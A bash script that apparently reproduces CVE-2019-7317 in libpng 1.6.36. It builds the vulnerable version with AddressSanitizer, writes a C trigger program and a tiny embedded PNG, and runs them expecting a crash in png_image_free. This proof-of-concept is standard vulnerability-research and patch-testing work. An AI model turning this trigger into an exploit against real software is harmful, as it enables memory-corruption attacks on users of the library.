#!/bin/bash
set -e

echo "[+] Cloning your fork of libpng..."
git clone https://github.com/hectellian/libpng.git libpng_cve > /dev/null
cd libpng_cve

echo "[+] Checking out vulnerable version..."
git checkout -b cve-2019-7317 v1.6.36 > /dev/null

echo "[+] Configuring and building libpng with AddressSanitizer..."
./configure CFLAGS="-g -O0 -fsanitize=address -fno-omit-frame-pointer" \
            LDFLAGS="-fsanitize=address" > /dev/null
make clean > /dev/null
make -j$(nproc) > /dev/null

echo "[+] Creating trigger_cve_2019_7317.c..."
cat > trigger_cve_2019_7317.c <<EOF
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <png.h>

int main() {
    printf("libpng version: %s\\n", png_get_libpng_ver(NULL));
    png_image image;
    memset(&image, 0, sizeof(image));
    image.version = PNG_IMAGE_VERSION;

    if (png_image_begin_read_from_file(&image, "crash_poc.png")) {
        png_bytep buffer = malloc(PNG_IMAGE_SIZE(image));
        if (buffer != NULL) {
            if (png_image_finish_read(&image, NULL, buffer, 0, NULL)) {
                // Do nothing
            }
            free(buffer);
        }
    }

    // Triggers the stack-use-after-return inside png_image_free()
    png_image_free(&image);
    return 0;
}
EOF

echo "[+] Creating minimal PNG image for crash..."
base64 -d > crash_poc.png <<EOF
iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR4nGNgYAAAAAMAAWgmWQ0AAAAASUVORK5CYII=
EOF

echo "[+] Compiling the PoC..."
gcc -fsanitize=address -g -O0 -I. -I./.libs -L.libs trigger_cve_2019_7317.c -o trigger_cve .libs/libpng16.a -lz -lm

echo "[+] Running the PoC (crash expected)..."
./trigger_cve || echo "[!] PoC crashed as expected."

echo "[+] Cleaning up..."
cd ..
rm -rf libpng_cve
